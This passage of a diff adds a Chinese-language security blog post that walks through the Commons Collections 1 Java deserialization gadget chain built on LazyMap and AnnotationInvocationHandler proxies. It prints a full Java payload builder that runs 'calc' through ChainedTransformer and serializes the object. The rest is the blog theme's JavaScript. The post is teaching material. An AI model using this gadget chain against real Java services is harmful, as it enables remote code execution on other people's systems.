+  <li>方法名不能是 toString、hashCode、annotationType。</li>
+</ul>
+
+<p>总之，反序列化利用链上，需要调用这个代理对象的一个无参方法，且不是 toString、hashCode、annotationType。</p>
+
+<p>值得一提的是，AnnotationInvocationHandler 的 readObject 方法中。</p>
+
+<p>memberValues 就是我们可控的对象，调用的 entrySet 就是一个无参方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747579983-b31e50b5-8cd0-4d86-b4f9-063ed1a81263.png" alt="img" /></p>
+
+<p>因此，我们直接用 AnnotationInvocationHandler 创建一个代理对象 proxyMap 用来代理 lazyMap。然后创建 AnnotationInvocationHandler 实例，传入这个 proxyMap 。</p>
+
+<p>最终利用链如下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747585268-fbd4dbed-444a-4343-99c4-5799962f5373.png" alt="img" /></p>
+
+<ul>
+  <li>最外层是一个 AnnotationInvocationHandler 对象，其 memberValues 是一个 Proxy。</li>
+  <li>
+    <p>Proxy 是一个 AnnotationInvocationHandler 对象，其 memberValues 是一个 LazyMap</p>
+  </li>
+  <li>LazyMap 的 transform 会调用 chainedTransformer，进而执行命令。</li>
+</ul>
+
+<p>来理解一下这一条反序列化的具体运行流程：</p>
+
+<p>首先 readObject，此时 memberValues 就是这个 proxyMap 。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747589785-0955dc0b-ba1a-499a-8de3-ccd46e417841.png" alt="img" /></p>
+
+<p>调用 entrySet 方法时进入 invoke 方法。此时已经进入 proxyMap 这个代理对象的 InvocationHandler（调用处理程序），此时的 memberValues 是 LazyMap。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747594350-6f7fb8fe-2a63-48da-8d3b-07c1c4a45a5f.png" alt="img" /></p>
+
+<p>执行 LazyMap.get(entrySet)</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747599448-287c5023-c1e9-4dd6-a4b7-c1cc511babbf.png" alt="img" /></p>
+
+<p>此时 map 是一个 HashMap，HashMap.containsKey 方法用于判断 map 中是否存在指定的 key 对应的映射关系。此前构造的 hashMap 没有赋值，所以自然不存在 entrySet 这个 key，因此进一步调用 factory.transform 方法，这里的 factory 是我们构造的 chainedTransformer，继而可以触发后面的利用链。</p>
+
+<p>运行效果如下：</p>
+
+<p>会抛出异常，也会执行命令。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747603576-80c56d27-d4c8-47eb-8ace-6e4831c2ad13.png" alt="img" /></p>
+
+<p>一个没有解决的问题是：调试的时候怎么也无法跟进到执行命令，IDEA 会忽略断点。这一点很迷。</p>
+
+<p>最终只能通过如下的方式简单测试：</p>
+
+<p>直接在 hashMap 中加入一个 key 为 “entrySet” 的键值对。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747610391-adf03f71-9946-4a0a-a631-f5c90f17a58a.png" alt="img" /></p>
+
+<p>此时自然就过不了 LazyMap.get 中的那个 if 了。运行后仅抛出异常，但不会执行命令。</p>
+
+<p>最终 payload 如下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestLazyMap</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span>
+                <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                        <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span>
+                                <span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span>
+                        <span class="o">),</span>
+                        <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                                <span class="s">"getMethod"</span><span class="o">,</span>
+                                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                        <span class="o">),</span>
+                        <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                                <span class="s">"invoke"</span><span class="o">,</span>
+                                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                        <span class="o">),</span>
+                        <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                                <span class="s">"exec"</span><span class="o">,</span>
+                                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">}</span>
+                        <span class="o">)</span>
+                <span class="o">});</span>
+
+        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"entrySet1"</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
+        
+        <span class="nc">LazyMap</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="o">(</span><span class="nc">LazyMap</span><span class="o">)</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
+
+        <span class="nc">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">InvocationHandler</span> <span class="n">h1</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">lazyMap</span><span class="o">);</span>
+
+        <span class="nc">Map</span> <span class="n">proxymap</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">)</span> <span class="nc">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="nc">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">(),</span> <span class="n">h1</span><span class="o">);</span>
+
+        <span class="nc">InvocationHandler</span> <span class="n">h2</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">proxymap</span><span class="o">);</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">h2</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="0x05-defaultmap-调用链">0x05 DefaultMap 调用链</h2>
+
+<p>DefaultMap 与 LazyMap 一样，使用 get 方法触发，因此与 LazyMap 利用链相同。</p>
+
+<h1 id="参考资料">参考资料</h1>
+
+<ul>
+  <li><a href="https://www.bilibili.com/video/BV1no4y1U7E1?from=search&amp;seid=1275269546208917278&amp;spm_id_from=333.337.0.0">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></li>
+  <li>
+    <p><a href="https://su18.org/post/ysoserial-su18-2/#commonscollections1">Java 反序列化漏洞（二） - Commons Collections</a></p>
+  </li>
+  <li><a href="https://blog.csdn.net/meizheming/article/details/73821812">java_集合体系之Map框架相关抽象类接口详解、源码</a></li>
+  <li><a href="http://wjlshare.com/archives/1535">Commons-Collections 1-7 利用链分析</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2021-12-18T22:39:49+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/cve/2021/08/18/CVE-2021-23419-open-graph-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90.html">CVE-2021-23419 open-graph 原型链污染分析</a></div><div class="next"><span>NEXT</span><a href="/java/2021/12/18/CommonsCollections6.html">CommonsCollections6</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
